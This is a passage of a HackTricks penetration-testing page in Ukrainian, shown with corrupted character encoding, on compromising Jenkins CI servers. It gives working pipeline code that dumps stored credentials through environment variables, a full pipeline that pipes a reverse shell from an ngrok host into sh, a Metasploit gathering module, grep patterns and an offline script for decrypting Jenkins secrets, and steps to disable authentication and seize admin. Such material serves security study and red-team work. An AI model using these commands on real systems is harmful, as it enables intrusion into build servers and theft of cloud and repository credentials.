–ú–æ–∂–ª–∏–≤–æ, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–æ–≤—ñ –¥–æ–≤–µ–¥–µ—Ç—å—Å—è **–æ–±—ñ–π—Ç–∏ –¥–µ—è–∫—ñ –∑–∞—Ö–∏—Å—Ç–∏ –≥—ñ–ª–æ–∫** (–∑–∞–ª–µ–∂–Ω–æ –≤—ñ–¥ –ø–ª–∞—Ç—Ñ–æ—Ä–º–∏ —Ç–∞ –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, —ó—Ö –º–æ–∂–Ω–∞ –æ–±—ñ–π—Ç–∏ –∞–±–æ –Ω—ñ).

–ù–∞–π–ø–æ—à–∏—Ä–µ–Ω—ñ—à—ñ —Å–ø–æ—Å–æ–±–∏ –∑–∞–ø—É—Å–∫—É –≤–ª–∞—Å–Ω–æ–≥–æ –∫–æ–Ω–≤–µ—î—Ä–∞:

* **Pull request** –¥–æ –æ—Å–Ω–æ–≤–Ω–æ—ó –≥—ñ–ª–∫–∏ (–∞–±–æ, –º–æ–∂–ª–∏–≤–æ, –¥–æ —ñ–Ω—à–∏—Ö –≥—ñ–ª–æ–∫)
* **Push –¥–æ –æ—Å–Ω–æ–≤–Ω–æ—ó –≥—ñ–ª–∫–∏** (–∞–±–æ, –º–æ–∂–ª–∏–≤–æ, –¥–æ —ñ–Ω—à–∏—Ö –≥—ñ–ª–æ–∫)
* **–û–Ω–æ–≤–ª–µ–Ω–Ω—è –æ—Å–Ω–æ–≤–Ω–æ—ó –≥—ñ–ª–∫–∏** —Ç–∞ –æ—á—ñ–∫—É–≤–∞–Ω–Ω—è, –ø–æ–∫–∏ –≤–æ–Ω–æ –±—É–¥–µ –≤–∏–∫–æ–Ω–∞–Ω–æ —è–∫–∏–º–æ—Å—å —á–∏–Ω–æ–º

{% hint style="info" %}
–Ø–∫—â–æ –≤–∏ —î **–∑–æ–≤–Ω—ñ—à–Ω—ñ–º –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º**, –≤–∏ –Ω–µ –ø–æ–≤–∏–Ω–Ω—ñ –æ—á—ñ–∫—É–≤–∞—Ç–∏ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è **PR –¥–æ –æ—Å–Ω–æ–≤–Ω–æ—ó –≥—ñ–ª–∫–∏** —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—é **—ñ–Ω—à–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞/–æ—Ä–≥–∞–Ω—ñ–∑–∞—Ü—ñ—ó** —Ç–∞ **–∑–∞–ø—É—Å–∫—É –∫–æ–Ω–≤–µ—î—Ä–∞**... –∞–ª–µ —è–∫—â–æ –≤—ñ–Ω **–ø–æ–≥–∞–Ω–æ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–∏–π**, –≤–∏ –º–æ–∂–µ—Ç–µ –ø–æ–≤–Ω—ñ—Å—Ç—é **–∫–æ–º–ø—Ä–æ–º–µ—Ç—É–≤–∞—Ç–∏ –∫–æ–º–ø–∞–Ω—ñ—ó, –ø—Ä–æ—Å—Ç–æ –µ–∫—Å–ø–ª—É–∞—Ç—É—é—á–∏ —Ü–µ**.
{% endhint %}

### RCE –∫–æ–Ω–≤–µ—î—Ä–∞

–£ –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–º—É —Ä–æ–∑–¥—ñ–ª—ñ RCE –≤–∂–µ –±—É–ª–æ –≤–∫–∞–∑–∞–Ω–æ —Ç–µ—Ö–Ω—ñ–∫—É –¥–ª—è [**–æ—Ç—Ä–∏–º–∞–Ω–Ω—è RCE, –∑–º—ñ–Ω—é—é—á–∏ –∫–æ–Ω–≤–µ—î—Ä**](./#rce-creating-modifying-pipeline).

### –ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ –∑–º—ñ–Ω–Ω–∏—Ö —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞

–ú–æ–∂–ª–∏–≤–æ –æ–≥–æ–ª–æ—Å–∏—Ç–∏ **–∑–º—ñ–Ω–Ω—ñ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞ —É –≤–∏–≥–ª—è–¥—ñ —á—ñ—Ç–∫–æ–≥–æ —Ç–µ–∫—Å—Ç—É** –¥–ª—è –≤—Å—å–æ–≥–æ –∫–æ–Ω–≤–µ—î—Ä–∞ –∞–±–æ –¥–ª—è –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏—Ö –µ—Ç–∞–ø—ñ–≤. –¶—ñ –∑–º—ñ–Ω–Ω—ñ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞ **–Ω–µ –ø–æ–≤–∏–Ω–Ω—ñ –º—ñ—Å—Ç–∏—Ç–∏ –∫–æ–Ω—Ñ—ñ–¥–µ–Ω—Ü—ñ–π–Ω–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó**, –∞–ª–µ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑–∞–≤–∂–¥–∏ –º–æ–∂–µ **–ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ –≤—Å—ñ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó –∫–æ–Ω–≤–µ—î—Ä–∞**/Jenkinsfiles:
```bash
pipeline {
agent {label 'built-in'}
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
```
### –í–∏—Ç—è–≥ —Å–µ–∫—Ä–µ—Ç—ñ–≤

–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ —Ç–µ, —è–∫ –∑–∞–∑–≤–∏—á–∞–π –æ–±—Ä–æ–±–ª—è—é—Ç—å—Å—è —Å–µ–∫—Ä–µ—Ç–∏ –≤ Jenkins, –ø–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ –±–∞–∑–æ–≤—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

–û–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –º–æ–∂—É—Ç—å –±—É—Ç–∏ **–æ–±–º–µ–∂–µ–Ω—ñ –≥–ª–æ–±–∞–ª—å–Ω–∏–º–∏ –ø–æ—Å—Ç–∞—á–∞–ª—å–Ω–∏–∫–∞–º–∏** (`/credentials/`) –∞–±–æ **–∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏–º–∏ –ø—Ä–æ–µ–∫—Ç–∞–º–∏** (`/job/<project-name>/configure`). –¢–æ–º—É, —â–æ–± –≤–∏—Ç—è–≥—Ç–∏ –≤—Å—ñ –∑ –Ω–∏—Ö, –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ **–∫–æ–º–ø—Ä–æ–º–µ—Ç—É–≤–∞—Ç–∏ –ø—Ä–∏–Ω–∞–π–º–Ω—ñ –≤—Å—ñ –ø—Ä–æ–µ–∫—Ç–∏**, —è–∫—ñ –º—ñ—Å—Ç—è—Ç—å —Å–µ–∫—Ä–µ—Ç–∏, —ñ –≤–∏–∫–æ–Ω–∞—Ç–∏ –≤–ª–∞—Å–Ω—ñ/–∑—ñ–ø—Å–æ–≤–∞–Ω—ñ –∫–æ–Ω–≤–µ—î—Ä–∏.

–Ñ —â–µ –æ–¥–Ω–∞ –ø—Ä–æ–±–ª–µ–º–∞: –¥–ª—è —Ç–æ–≥–æ, —â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ **—Å–µ–∫—Ä–µ—Ç –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ env** –∫–æ–Ω–≤–µ—î—Ä—É, –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ **–∑–Ω–∞—Ç–∏ –Ω–∞–∑–≤—É —Ç–∞ —Ç–∏–ø —Å–µ–∫—Ä–µ—Ç—É**. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, —è–∫—â–æ –≤–∏ —Å–ø—Ä–æ–±—É—î—Ç–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ **—Å–µ–∫—Ä–µ—Ç `usernamePassword`** —è–∫ **—Å–µ–∫—Ä–µ—Ç —Ç–∏–ø—É `string`**, –≤–∏ –æ—Ç—Ä–∏–º–∞—î—Ç–µ —Ü—é **–ø–æ–º–∏–ª–∫—É**:
```
ERROR: Credentials 'flag2' is of type 'Username with password' where 'org.jenkinsci.plugins.plaincredentials.StringCredentials' was expected
```
–û—Å—å —è–∫ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –¥–µ—è–∫—ñ —Ç–∏–ø–æ–≤—ñ —Ç–∏–ø–∏ —Å–µ–∫—Ä–µ—Ç—ñ–≤:
```bash
withCredentials([usernamePassword(credentialsId: 'flag2', usernameVariable: 'USERNAME', passwordVariable: 'PASS')]) {
sh '''
env #Search for USERNAME and PASS
'''
}

withCredentials([string(credentialsId: 'flag1', variable: 'SECRET')]) {
sh '''
env #Search for SECRET
'''
}

withCredentials([usernameColonPassword(credentialsId: 'mylogin', variable: 'USERPASS')]) {
sh '''
env # Search for USERPASS
'''
}

# You can also load multiple env variables at once
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
env
'''
}
```
–í –∫—ñ–Ω—Ü—ñ —Ü—ñ—î—ó —Å—Ç–æ—Ä—ñ–Ω–∫–∏ –≤–∏ –º–æ–∂–µ—Ç–µ **–∑–Ω–∞–π—Ç–∏ –≤—Å—ñ —Ç–∏–ø–∏ –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö**: [https://www.jenkins.io/doc/pipeline/steps/credentials-binding/](https://www.jenkins.io/doc/pipeline/steps/credentials-binding/)

{% hint style="warning" %}
–ù–∞–π–∫—Ä–∞—â–∏–π —Å–ø–æ—Å—ñ–± **–≤–∏—Ç—è–≥—Ç–∏ –≤—Å—ñ —Å–µ–∫—Ä–µ—Ç–∏ –æ–¥–Ω–æ—á–∞—Å–Ω–æ** - —Ü–µ **–∫–æ–º–ø—Ä–æ–º–µ—Ç—É–≤–∞—Ç–∏** –º–∞—à–∏–Ω—É **Jenkins** (–∑–∞–ø—É—Å—Ç–∏–≤—à–∏ –∑–≤–æ—Ä–æ—Ç–Ω–∏–π shell, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –Ω–∞ **–≤–±—É–¥–æ–≤–∞–Ω–æ–º—É –≤—É–∑–ª—ñ**) —ñ –ø–æ—Ç—ñ–º **–≤–∏—Ç—ñ–∫–∞—Ç–∏** **–æ—Å–Ω–æ–≤–Ω—ñ –∫–ª—é—á—ñ** —Ç–∞ **–∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω—ñ —Å–µ–∫—Ä–µ—Ç–∏** —ñ —Ä–æ–∑—à–∏—Ñ—Ä–æ–≤—É–≤–∞—Ç–∏ —ó—Ö –æ—Ñ–ª–∞–π–Ω.\
–î–æ–∫–ª–∞–¥–Ω—ñ—à–µ –ø—Ä–æ —Ü–µ –º–æ–∂–Ω–∞ –¥—ñ–∑–Ω–∞—Ç–∏—Å—è –≤ —Ä–æ–∑–¥—ñ–ª—ñ [–í—É–∑–ª–∏ —Ç–∞ –∞–≥–µ–Ω—Ç–∏](./#nodes-and-agents) —Ç–∞ –≤ —Ä–æ–∑–¥—ñ–ª—ñ [–ü—ñ—Å–ª—è–µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ–π–Ω–∏–π —Ä–æ–∑–¥—ñ–ª](./#post-exploitation).
{% endhint %}

### –¢—Ä–∏–≥–µ—Ä–∏

–ó [–¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—ó](https://www.jenkins.io/doc/book/pipeline/syntax/#triggers): –î–∏—Ä–µ–∫—Ç–∏–≤–∞ `triggers` –≤–∏–∑–Ω–∞—á–∞—î **–∞–≤—Ç–æ–º–∞—Ç–∏–∑–æ–≤–∞–Ω—ñ —Å–ø–æ—Å–æ–±–∏, —è–∫–∏–º–∏ –ø–æ–≤–∏–Ω–µ–Ω –±—É—Ç–∏ –ø–µ—Ä–µ–∑–∞–ø—É—â–µ–Ω–∏–π** –∫–æ–Ω–≤–µ—î—Ä. –î–ª—è –∫–æ–Ω–≤–µ—î—Ä—ñ–≤, —è–∫—ñ —ñ–Ω—Ç–µ–≥—Ä–æ–≤–∞–Ω—ñ –∑ –¥–∂–µ—Ä–µ–ª–æ–º, —Ç–∞–∫–∏–º —è–∫ GitHub –∞–±–æ BitBucket, `triggers` –º–æ–∂—É—Ç—å –±—É—Ç–∏ –Ω–µ–ø–æ—Ç—Ä—ñ–±–Ω—ñ, –æ—Å–∫—ñ–ª—å–∫–∏ —ñ–Ω—Ç–µ–≥—Ä–∞—Ü—ñ—è –Ω–∞ –æ—Å–Ω–æ–≤—ñ –≤–µ–±-–≥–∞—á–∫—ñ–≤ –≤–∂–µ, –π–º–æ–≤—ñ—Ä–Ω–æ, –ø—Ä–∏—Å—É—Ç–Ω—è. –î–æ—Å—Ç—É–ø–Ω—ñ —Ç—Ä–∏–≥–µ—Ä–∏ –Ω–∞—Ä–∞–∑—ñ - `cron`, `pollSCM` —Ç–∞ `upstream`.

–ü—Ä–∏–∫–ª–∞–¥ Cron:
```bash
triggers { cron('H */4 * * 1-5') }
```
–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ **—ñ–Ω—à—ñ –ø—Ä–∏–∫–ª–∞–¥–∏ –≤ –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—ó**.

### –í—É–∑–ª–∏ —Ç–∞ –∞–≥–µ–Ω—Ç–∏

**–ï–∫–∑–µ–º–ø–ª—è—Ä Jenkins** –º–æ–∂–µ –º–∞—Ç–∏ **—Ä—ñ–∑–Ω—ñ –∞–≥–µ–Ω—Ç–∏, —è–∫—ñ –ø—Ä–∞—Ü—é—é—Ç—å –Ω–∞ —Ä—ñ–∑–Ω–∏—Ö –º–∞—à–∏–Ω–∞—Ö**. –ó —Ç–æ—á–∫–∏ –∑–æ—Ä—É –∞—Ç–∞–∫—É–≤–∞–Ω–Ω—è, –¥–æ—Å—Ç—É–ø –¥–æ —Ä—ñ–∑–Ω–∏—Ö –º–∞—à–∏–Ω –æ–∑–Ω–∞—á–∞—î **—Ä—ñ–∑–Ω—ñ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ —Ö–º–∞—Ä–∏** –¥–ª—è –∫—Ä–∞–¥—ñ–∂–∫–∏ –∞–±–æ **—Ä—ñ–∑–Ω–∏–π –º–µ—Ä–µ–∂–µ–≤–∏–π –¥–æ—Å—Ç—É–ø**, —è–∫–∏–π –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó —ñ–Ω—à–∏—Ö –º–∞—à–∏–Ω.

–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ –±–∞–∑–æ–≤—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

–í–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–ª—ñ—á–∏—Ç–∏ **–Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω—ñ –≤—É–∑–ª–∏** –≤ `/computer/`, –¥–µ –∑–∞–∑–≤–∏—á–∞–π –∑–Ω–∞–π–¥–µ—Ç–µ \*\*`–í–±—É–¥–æ–≤–∞–Ω–∏–π –≤—É–∑–æ–ª` \*\* (—è–∫–∏–π —î –≤—É–∑–ª–æ–º, –Ω–∞ —è–∫–æ–º—É –ø—Ä–∞—Ü—é—î Jenkins) —Ç–∞, –º–æ–∂–ª–∏–≤–æ, —â–µ –¥–µ–∫—ñ–ª—å–∫–∞:

![](<../../.gitbook/assets/image (25).png>)

–û—Å–æ–±–ª–∏–≤–æ —Ü—ñ–∫–∞–≤–æ —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç—É–≤–∞—Ç–∏ **–≤–±—É–¥–æ–≤–∞–Ω–∏–π –≤—É–∑–æ–ª**, –æ—Å–∫—ñ–ª—å–∫–∏ –≤—ñ–Ω –º—ñ—Å—Ç–∏—Ç—å —á—É—Ç–ª–∏–≤—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é Jenkins.

–©–æ–± –≤–∫–∞–∑–∞—Ç–∏, —â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ **–∑–∞–ø—É—Å—Ç–∏—Ç–∏** **–∫–æ–Ω–≤–µ—î—Ä** –Ω–∞ **–≤–±—É–¥–æ–≤–∞–Ω–æ–º—É –≤—É–∑–ª—ñ Jenkins**, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∫–∞–∑–∞—Ç–∏ –≤ –∫–æ–Ω–≤–µ—î—Ä—ñ –Ω–∞—Å—Ç—É–ø–Ω—É –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—é:
```bash
pipeline {
agent {label 'built-in'}
```
### –ü–æ–≤–Ω–∏–π –ø—Ä–∏–∫–ª–∞–¥

–ü–∞–π–ø–ª–∞–π–Ω –Ω–∞ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–º—É –∞–≥–µ–Ω—Ç—ñ, –∑ —Ç—Ä–∏–≥–µ—Ä–æ–º cron, –∑—ñ –∑–º—ñ–Ω–Ω–∏–º–∏ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞ –ø–∞–π–ø–ª–∞–π–Ω—É —Ç–∞ –µ—Ç–∞–ø—É, –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è–º 2 –∑–º—ñ–Ω–Ω–∏—Ö –Ω–∞ –∫—Ä–æ—Ü—ñ —Ç–∞ –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–Ω—è–º –∑–≤–æ—Ä–æ—Ç–Ω–æ–≥–æ —à–µ–ª—É:
```bash
pipeline {
agent {label 'built-in'}
triggers { cron('H */4 * * 1-5') }
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
curl https://reverse-shell.sh/0.tcp.ngrok.io:16287 | sh PASS
'''
}
}
}

post {
always {
cleanWs()
}
}
}
```
## –ü—ñ—Å–ª—è–µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ–π–Ω–∏–π –µ—Ç–∞–ø

### Metasploit
```
msf> post/multi/gather/jenkins_gather
```
### –°–µ–∫—Ä–µ—Ç–∏ Jenkins

–í–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–≥–ª—è–Ω—É—Ç–∏ —Å–ø–∏—Å–æ–∫ —Å–µ–∫—Ä–µ—Ç—ñ–≤, –∑–≤–µ—Ä–Ω—É–≤—à–∏—Å—å –¥–æ `/credentials/`, —è–∫—â–æ —É –≤–∞—Å —î –¥–æ—Å—Ç–∞—Ç–Ω—å–æ –¥–æ–∑–≤–æ–ª—ñ–≤. –ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ —Ü–µ –±—É–¥–µ –ª–∏—à–µ —Å–ø–∏—Å–æ–∫ —Å–µ–∫—Ä–µ—Ç—ñ–≤ —É —Ñ–∞–π–ª—ñ `credentials.xml`, –∞–ª–µ **—Ñ–∞–π–ª–∏ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó –∑–±—ñ—Ä–∫–∏** –º–æ–∂—É—Ç—å —Ç–∞–∫–æ–∂ –º—ñ—Å—Ç–∏—Ç–∏ **–±—ñ–ª—å—à–µ —Å–µ–∫—Ä–µ—Ç—ñ–≤**.

–Ø–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ **–ø–µ—Ä–µ–≥–ª—è–¥–∞—Ç–∏ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—é –∫–æ–∂–Ω–æ–≥–æ –ø—Ä–æ–µ–∫—Ç—É**, –≤–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ —Ç–∞–º **–Ω–∞–∑–≤–∏ —Å–µ–∫—Ä–µ—Ç—ñ–≤ (–ø–∞—Ä–æ–ª—ñ–≤)**, —è–∫—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è –¥–ª—è –¥–æ—Å—Ç—É–ø—É –¥–æ —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—é —Ç–∞ **—ñ–Ω—à—ñ —Å–µ–∫—Ä–µ—Ç–∏ –ø—Ä–æ–µ–∫—Ç—É**.

![](<../../.gitbook/assets/image (9) (1) (1) (1) (1).png>)

#### –ó Groovy

{% content-ref url="jenkins-dumping-secrets-from-groovy.md" %}
[jenkins-dumping-secrets-from-groovy.md](jenkins-dumping-secrets-from-groovy.md)
{% endcontent-ref %}

#### –ó –¥–∏—Å–∫—É

–¶—ñ —Ñ–∞–π–ª–∏ –ø–æ—Ç—Ä—ñ–±–Ω—ñ –¥–ª—è **—Ä–æ–∑—à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è —Å–µ–∫—Ä–µ—Ç—ñ–≤ Jenkins**:

* secrets/master.key
* secrets/hudson.util.Secret

–¢–∞–∫—ñ **—Å–µ–∫—Ä–µ—Ç–∏ –∑–∞–∑–≤–∏—á–∞–π –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ –≤**:

* credentials.xml
* jobs/.../build.xml
* jobs/.../config.xml

–û—Å—å —Ä–µ–≥—É–ª—è—Ä–Ω–∏–π –≤–∏—Ä–∞–∑ –¥–ª—è —ó—Ö –ø–æ—à—É–∫—É:
```bash
# Find the secrets
grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"
# Print only the filenames where the secrets are located
grep -lre "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"

# Secret example
credentials.xml: <secret>{AQAAABAAAAAwsSbQDNcKIRQMjEMYYJeSIxi2d3MHmsfW3d1Y52KMOmZ9tLYyOzTSvNoTXdvHpx/kkEbRZS9OYoqzGsIFXtg7cw==}</secret>
```
#### –†–æ–∑—à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è —Å–µ–∫—Ä–µ—Ç—ñ–≤ Jenkins –æ—Ñ–ª–∞–π–Ω

–Ø–∫—â–æ –≤–∏ –≤–∏—Ç—è–≥–ª–∏ **–Ω–µ–æ–±—Ö—ñ–¥–Ω—ñ –ø–∞—Ä–æ–ª—ñ –¥–ª—è —Ä–æ–∑—à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è —Å–µ–∫—Ä–µ—Ç—ñ–≤**, —Å–∫–æ—Ä–∏—Å—Ç–∞–π—Ç–µ—Å—è [**—Ü–∏–º —Å–∫—Ä–∏–ø—Ç–æ–º**](https://github.com/gquere/pwn\_jenkins/blob/master/offline\_decryption/jenkins\_offline\_decrypt.py) **–¥–ª—è —Ä–æ–∑—à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è —Ü–∏—Ö —Å–µ–∫—Ä–µ—Ç—ñ–≤**.
```bash
python3 jenkins_offline_decrypt.py master.key hudson.util.Secret cred.xml
06165DF2-C047-4402-8CAB-1C8EC526C115
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt985Hbb8KfIImS6dZlVG6swiotCiIlg/P7aME9PvZNUgg2Iyf2FT
```
#### –†–æ–∑—à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è —Å–µ–∫—Ä–µ—Ç—ñ–≤ Jenkins –∑ Groovy
```bash
println(hudson.util.Secret.decrypt("{...}"))
```
### –°—Ç–≤–æ—Ä–µ–Ω–Ω—è –Ω–æ–≤–æ–≥–æ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞

1. –û—Ç—Ä–∏–º–∞–π—Ç–µ –¥–æ—Å—Ç—É–ø –¥–æ —Ñ–∞–π–ª—É –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó Jenkins —É `/var/lib/jenkins/config.xml` –∞–±–æ `C:\Program Files (x86)\Jenkins\`
2. –ó–Ω–∞–π–¥—ñ—Ç—å —Å–ª–æ–≤–æ `<useSecurity>true</useSecurity>` —Ç–∞ –∑–º—ñ–Ω—ñ—Ç—å —Å–ª–æ–≤–æ **`true`** –Ω–∞ **`false`**.
1. `sed -i -e 's/<useSecurity>true</<useSecurity>false</g' config.xml`
3. **–ü–µ—Ä–µ–∑–∞–ø—É—Å—Ç—ñ—Ç—å** —Å–µ—Ä–≤–µ—Ä **Jenkins**: `service jenkins restart`
4. –¢–µ–ø–µ—Ä –∑–Ω–æ–≤—É –ø–µ—Ä–µ–π–¥—ñ—Ç—å –Ω–∞ –ø–æ—Ä—Ç–∞–ª Jenkins, —ñ **Jenkins –Ω–µ –±—É–¥–µ –∑–∞–ø–∏—Ç—É–≤–∞—Ç–∏ –∂–æ–¥–Ω–∏—Ö –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö** –Ω–∞ —Ü–µ–π —Ä–∞–∑. –ü–µ—Ä–µ–π–¥—ñ—Ç—å –¥–æ "**–ö–µ—Ä—É–≤–∞–Ω–Ω—è Jenkins**", —â–æ–± –∑–Ω–æ–≤—É –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ **–ø–∞—Ä–æ–ª—å –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞**.
5. **–£–≤—ñ–º–∫–Ω—ñ—Ç—å** –∑–Ω–æ–≤—É **–±–µ–∑–ø–µ–∫—É**, –∑–º—ñ–Ω–∏–≤—à–∏ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è –Ω–∞ `<useSecurity>true</useSecurity>` —ñ **–∑–Ω–æ–≤—É –ø–µ—Ä–µ–∑–∞–ø—É—Å—Ç—ñ—Ç—å Jenkins**.

## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://github.com/gquere/pwn\_jenkins](https://github.com/gquere/pwn\_jenkins)
* [https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/](https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/)
* [https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password](https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password)
* [https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html](https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html)
* [https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072](https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072)
* [https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3](https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3)

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º–æ–≤–∞–Ω—É –≤ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
